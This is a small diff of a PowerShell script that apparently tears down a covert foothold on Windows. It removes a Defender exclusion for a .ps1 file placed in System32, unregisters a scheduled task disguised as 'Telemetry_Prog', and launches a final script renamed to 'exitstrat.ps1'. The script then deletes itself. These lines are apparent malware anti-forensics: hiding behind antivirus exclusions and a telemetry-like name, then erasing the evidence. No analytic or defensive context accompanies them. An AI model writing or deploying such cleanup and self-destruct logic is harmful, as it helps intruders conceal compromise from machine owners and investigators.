@@ -11,6 +11,6 @@ Remove-MpPreference -ExclusionPath "C:\Windows\System32\ddrcc.ps1" -Force
 # removes scheduled task
 Unregister-ScheduledTask -TaskName "Telemetry_Prog" -Confirm:$false
 # start final cleanup file
-& "C:\Windows\System32\cleanup.ps1"
+& "C:\Windows\System32\exitstrat.ps1"
 # self destruct file
 Remove-Item -Path $MyInvocation.MyCommand.Source -Force
